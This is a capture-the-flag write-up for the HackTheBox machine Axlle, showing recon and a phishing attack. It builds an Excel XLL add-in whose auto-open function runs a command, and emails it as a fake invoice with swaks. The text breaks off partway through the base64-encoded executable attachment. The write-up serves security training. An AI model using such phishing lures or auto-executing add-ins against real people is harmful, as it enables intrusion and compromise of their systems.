---
title: HTB: Axlle
url: https://0xdf.gitlab.io/2024/11/16/htb-axlle.html
date: 2024-11-16T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-axlle, ctf, hackthebox, nmap, windows, subdomain, netexec, feroxbuster, xll, phishing, visual-studio, dll, swaks, hmailserver, url-file, msfvenom, bloodhound, bloodhound-python, sharphound, forcechangepassword, standalonerunner
---

![Axlle](/img/axlle-cover.png)

Axlle is a Windows host with some niche Windows exploitation paths. I’ll start by phishing a user using a Excel Add-On file, XLL. These are since mostly blocked, but were previously quite big in the phishing scene. Then I’ll modify a URL file to run my reverse shell. I’ll find come creds for the next user, and change the password on the next. For administrator, I’ll abuse the StandaloneRunner.exe LOLBIN.

## Box Info

| Name | [Axlle](https://hackthebox.com/machines/axlle)  [Axlle](https://hackthebox.com/machines/axlle) [Play on HackTheBox](https://hackthebox.com/machines/axlle) |
| --- | --- |
| Release Date | [22 Jun 2024](https://twitter.com/hackthebox_eu/status/1803820135481852070) |
| Retire Date | 16 Nov 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Axlle |
| Radar Graph | Radar chart for Axlle |
| First Blood User | 03:06:49[artex artex](https://app.hackthebox.com/users/150393) |
| First Blood Root | 03:34:53[celesian celesian](https://app.hackthebox.com/users/114435) |
| Creator | [schex schex](https://app.hackthebox.com/users/29963) |

## Recon

### nmap

`nmap` finds a bunch of open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.21
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-26 08:57 EDT
Nmap scan report for 10.10.11.21
Host is up (0.085s latency).
Not shown: 65512 filtered ports
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49409/tcp open  unknown
49410/tcp open  unknown
49416/tcp open  unknown
49423/tcp open  unknown
49436/tcp open  unknown
49664/tcp open  unknown
49668/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
oxdf@hacky$ nmap -p 25,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49409,49410,49416,49423,49436,49664,49668 -sCV 10.10.11.21
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-26 08:59 EDT
Nmap scan report for 10.10.11.21
Host is up (0.085s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Axlle Development
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-26 12:58:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: AXLLE
|   NetBIOS_Domain_Name: AXLLE
|   NetBIOS_Computer_Name: MAINFRAME
|   DNS_Domain_Name: axlle.htb
|   DNS_Computer_Name: MAINFRAME.axlle.htb
|   DNS_Tree_Name: axlle.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2024-06-26T13:01:14+00:00
| ssl-cert: Subject: commonName=MAINFRAME.axlle.htb
| Not valid before: 2024-05-19T11:25:03
|_Not valid after:  2024-11-18T11:25:03
|_ssl-date: 2024-06-26T13:01:54+00:00; -16s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49409/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49410/tcp open  msrpc         Microsoft Windows RPC
49416/tcp open  msrpc         Microsoft Windows RPC
49423/tcp open  msrpc         Microsoft Windows RPC
49436/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/26%Time=667C10A4%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -15s, deviation: 0s, median: -16s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-06-26T13:01:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 306.17 seconds

```

These are the typical Windows domain controller ports, plus SMTP (25) and HTTP (80), as well as both RDP (3389) and WinRM (5985).

`nmap` identifies the domain name `axlle.htb`, and the hostname `MAINFRAME`. I’ll run `ffuf` to fuzz for subdomains on port 80, but not find any. I’ll update my `hosts` file (or let `netexec` do it in the next step):

```
10.10.11.21 axlle.htb mainframe mainframe.axlle.htb

```

I’ll start with a focus on HTTP and SMB. I’ll keep in mind that I can likely send email via SMTP, and if I get creds I can connect over RDP or WinRM.

### SMB - TCP 445

`netexec` shows the same host and domain names, as well as the full OS:

```

oxdf@hacky$ netexec smb axlle.htb
SMB         10.10.11.21     445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)

```

As of [13 November 2024](https://x.com/mpgn_x64/status/1856663502288540040), `netexec` can also update my `hosts` file:

```

oxdf@hacky$ netexec smb 10.10.11.21 --generate-hosts-file /etc/hosts
SMB         10.10.11.21     445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
oxdf@hacky$ tail -1 /etc/hosts
10.10.11.21    MAINFRAME MAINFRAME.axlle.htb axlle.htb

```

I’m not able to access SMB with guest or null auth:

```

oxdf@hacky$ netexec smb axlle.htb -u guest -p ''
SMB         10.10.11.21     445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.21     445    MAINFRAME        [-] axlle.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb axlle.htb -u oxdf -p ''
SMB         10.10.11.21     445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.21     445    MAINFRAME        [-] axlle.htb\oxdf: STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec smb axlle.htb -u oxdf -p oxdf
SMB         10.10.11.21     445    MAINFRAME        [*] Windows Server 2022 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.21     445    MAINFRAME        [-] axlle.htb\oxdf:oxdf STATUS_LOGON_FAILURE

```

### Website - TCP 80

#### Site

The site is for a software development company:

![image-20240626092146141](/img/image-20240626092146141.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The interesting part of the page is in the middle:

![image-20240626092425827](/img/image-20240626092425827.png)

It’s asking for invoices to be sent to `accounts@axlle.htb` as Excel documents, and notes that macros are disabled.

#### Tech Stack

The HTTP response headers show that the site is running on IIS:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 01 Jan 2024 12:37:19 GMT
Accept-Ranges: bytes
ETag: "83849042af3cda1:0"
Server: Microsoft-IIS/10.0
Date: Wed, 26 Jun 2024 13:20:59 GMT
Connection: close
Content-Length: 10228

```

The main site also loads as `index.html`, suggesting it’s a static page. The 404 page is the [standard IIS page](/cheatsheets/404#iis):

![image-20240626092603094](/img/image-20240626092603094.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site using a lowercase wordlist because it’s Windows, but it finds nothing interesting:

```

oxdf@hacky$ feroxbuster -u http://axlle.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://axlle.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      166l      769w    10228c http://axlle.htb/
301      GET        2l       10w      143c http://axlle.htb/js => http://axlle.htb/js/
301      GET        2l       10w      144c http://axlle.htb/css => http://axlle.htb/css/
301      GET        2l       10w      147c http://axlle.htb/assets => http://axlle.htb/assets/
301      GET        2l       10w      151c http://axlle.htb/assets/img => http://axlle.htb/assets/img/
400      GET        6l       26w      324c http://axlle.htb/error%1F_log
400      GET        6l       26w      324c http://axlle.htb/js/error%1F_log
400      GET        6l       26w      324c http://axlle.htb/css/error%1F_log
400      GET        6l       26w      324c http://axlle.htb/assets/error%1F_log
400      GET        6l       26w      324c http://axlle.htb/assets/img/error%1F_log
[####################] - 47s   132920/132920  0s      found:10      errors:0
[####################] - 47s    26584/26584   570/s   http://axlle.htb/ 
[####################] - 46s    26584/26584   572/s   http://axlle.htb/js/ 
[####################] - 47s    26584/26584   572/s   http://axlle.htb/css/ 
[####################] - 46s    26584/26584   572/s   http://axlle.htb/assets/ 
[####################] - 46s    26584/26584   573/s   http://axlle.htb/assets/img/  

```

## Shell as gideon.hamill

### XLL Background

As Microsoft has been flirting on and off for years with making Office macros more difficult to run and even [blocking them entirely](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked), the Excel add-in file has risen in popularity among malicious actors:
- [There’s been a big rise in phishing attacks using Microsoft Excel XLL add-ins](https://www.zdnet.com/article/theres-been-a-big-rise-in-phishing-attacks-using-microsoft-excel-xll-add-ins/) - Jan 27 2022
- [Do you know what an Excel XLL file is? The hackers do.](https://smartthinking.solutions/2023/01/26/do-you-know-what-an-excel-xll-file-is-the-hackers-do/) - 26 Jan 2023
- [Use of Excel .XLL Add-Ins Soars Nearly 600% to Infect Systems in Phishing Attacks](https://blog.knowbe4.com/use-of-excel-.xll-add-ins-soars-nearly-600-to-infect-systems-in-phishing-attacks) - Feb 8 2024

The Excel XLL file has the Excel icon, but is actually a Windows portable executable (PE) file, which makes it a nice tool for social engineering. It’s worth noting that Microsoft moved to [block untrusted XLL add-ins by default](https://www.bleepingcomputer.com/news/microsoft/microsoft-excel-now-blocking-untrusted-xll-add-ins-by-default/) in 2023.

[This repo](https://github.com/Octoberfest7/XLL_Phishing) has a really nice technical writeup of what malicious XLL add-ins look like and how they work in phishing.

### HelloWorldXll

#### Code

[This repo](https://github.com/edparcell/HelloWorldXll) has a really simple Hello World example of an XLL, as well as instructions for how to get it setup in Visual studio. The code has a `HelloWorldXll.sln` Visual Studio project file, and a `HelloWorldXll` directory with the source files.

`HelloWorldXll.cpp` is the interesting part of the add-in:

```

// HelloWorldXll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

short __stdcall xlAutoOpen()
{
	char *text = "Hello world";
	size_t text_len = strlen(text);
	XLOPER message;
	message.xltype = xltypeStr;
	message.val.str = (char *)malloc(text_len + 2);
	memcpy(message.val.str + 1, text, text_len + 1);
	message.val.str[0] = (char)text_len;
	XLOPER dialog_type;
	dialog_type.xltype = xltypeInt;
	dialog_type.val.w = 2;
	Excel4(xlcAlert, NULL, 2, &message, &dialog_type);
	return 1;
}

```

This `xlAutoOpen` function will do exactly what it sounds like - execute on Excel open. In this case, it’s defining a message box dialog with the string “Hello world” and showing it using Excel.

#### Set Up Dev Environment

The repo has good instructions for setting up the dev environment in Visual Studio. These instructions are not actually required to get a successful malicious plugin. In fact, all I need is a DLL with the `xlAutoOpen` function exported. I could take my source file and compile it on Linux with `x86_64-w64-mingw32-gcc <source.c> -shared -o <malicious.xll>`. I’ll show the most interesting way to do it in Visual Studio.

The Excel SDK provides functions for interaction with Excel (including the message box pop shown in the example above). Still, for the sake of testing this, I’ll follow the instructions. It recommends using the 2015 community edition of Visual Studio. I’m using Visual Studio 2022 and it works just fine.

It also recommends the [Excel 2010 SDK](https://www.microsoft.com/en-us/download/details.aspx?id=20199) installed to the default location. The most recent Excel SDK is the 2013 version. Either will work, though I’ll need to update the project to use the 2013 version if I go that route. For the sake of understanding, I will. I’ll download it [here](https://www.microsoft.com/en-us/download/details.aspx?id=35567). It by default installs at `C:\`, which is fine:

![image-20240626163558408](/img/image-20240626163558408.png)

#### Default Build

I’ll open Visual Studio and select “Clone a repository”, giving it the path to HelloWorldXll. When it opens, if I try to build the solution, it will fail:

![image-20240626163928895](/img/image-20240626163928895.png)

Had I used the 2010 Excel SDK this wouldn’t have happened. I’ll need to update this. In the Solution Explorer window, I’ll right click on HelloWorldXll and select Properties. Under “C/C++” –> “General”, I’ll see the path to the 2010 SDK that isn’t on my machine:

![image-20240626164115099](/img/image-20240626164115099.png)

I’ll update the date to 2013 (in two placed in that path).

There’s another issue under “Linker” –> “Input” that I’ll update:

![image-20240626164327130](/img/image-20240626164327130.png)

These could also be changed in the `HelloWorldXll.vcxproj` file:

[![image-20240626164417129](/img/image-20240626164417129.png)*Click for full size image*](/img/image-20240626164417129.png)

Once I fix that, it builds just fine:

[![image-20240626164437062](/img/image-20240626164437062.png)*Click for full size image*](/img/image-20240626164437062.png)

The result is in the `x64\Debug` folder:

![image-20240626165209883](/img/image-20240626165209883.png)

Double clicking opens Excel, which pops a warning:

![image-20240626165242824](/img/image-20240626165242824.png)

If I click “Enable this add-in for this session only”:

![image-20240626165302253](/img/image-20240626165302253.png)

It works.

### Axlle POC

#### Update Code

To test this on Axlle, I’ll update `HelloWorldXll.cpp`:

```

// HelloWorldXll.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

short __stdcall xlAutoOpen()
{
	char* command = "cmd.exe /c ping -n 1 10.10.14.6";
	int result = system(command);
	return 1;
}

```

I’ll build this, but first it’s really important to make sure it’s building a Release build, not a Debug. The Debug build requires additional DLLs that may not be installed on the remote machine (and thus would just fail).

#### Local Run

On double clicking on the result, and enabling the add-in, a CMD window pops up:

![image-20240626165802848](/img/image-20240626165802848.png)

This Windows VM can’t talk to 10.10.14.6, so it’s going to hang for a second and then go away. But that’s a good sign.

#### On Axlle

To test this on Axlle, I’ll send it to `accounts@axlle.htb`. I like the command line tool `swaks` (`apt install swaks`) with the following options:
- `--to accounts@axlle.htb` - The account to send to according to the webpage.
- `--from 0xdf@axlle.htb` - Doesn’t really matter.
- `--header "Subject: Invoice overdue!"` - Setting the subject line.
- `--body ...` - Setting the body message
- `--attach ...` - The XLL file.

```

oxdf@hacky$ swaks --to accounts@axlle.htb --from 0xdf@axlle.htb --header "Subject: Invoice overdue!" --body "Please pay the attached invioce ASAP. It is past due." --attach invoice-ping.xll
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying axlle.htb:25...
=== Connected to axlle.htb.
<-  220 MAINFRAME ESMTP
 -> EHLO hacky
<-  250-MAINFRAME
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<0xdf@axlle.htb>
<-  250 OK
 -> RCPT TO:<accounts@axlle.htb>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Wed, 26 Jun 2024 17:02:13 -0400
 -> To: accounts@axlle.htb
 -> From: 0xdf@axlle.htb
 -> Subject: Invoice overdue!
 -> Message-Id: <20240626170213.1499947@hacky>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_1499947"
 ->
 -> ------=_MIME_BOUNDARY_000_1499947
 -> Content-Type: text/plain
 ->
 -> Please pay the attached invioce ASAP. It is past due.
 -> ------=_MIME_BOUNDARY_000_1499947
 -> Content-Type: application/octet-stream; name="invoice-ping.xll"
 -> Content-Description: invoice-ping.xll
 -> Content-Disposition: attachment; filename="invoice-ping.xll"
 -> Content-Transfer-Encoding: BASE64
 ->
 -> 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
